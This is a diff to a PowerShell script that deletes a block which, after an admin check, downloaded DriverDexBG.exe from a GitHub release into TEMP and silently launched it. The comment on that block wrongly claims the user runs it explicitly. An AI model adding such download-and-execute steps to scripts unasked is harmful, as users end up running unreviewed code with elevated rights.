@@ -84,13 +84,7 @@ if (-not (Test-IsAdmin)) {
     }
     exit
 }
-# User downloads and runs explicitly — they can see what they're running
-try {
-    Invoke-WebRequest -Uri 'https://github.com/rhshourav/driverdex/releases/latest/download/DriverDexBG.exe' -OutFile "$env:TEMP\DriverDexBG.exe" -ErrorAction Stop
-    Start-Process "$env:TEMP\DriverDexBG.exe" -ErrorAction SilentlyContinue
-} catch {
-    Write-Host "  [!] DriverDex download skipped: $($_.Exception.Message)" -ForegroundColor DarkYellow
-}
+
 # ================================================================
 #  CONSOLE SETUP
 # ================================================================
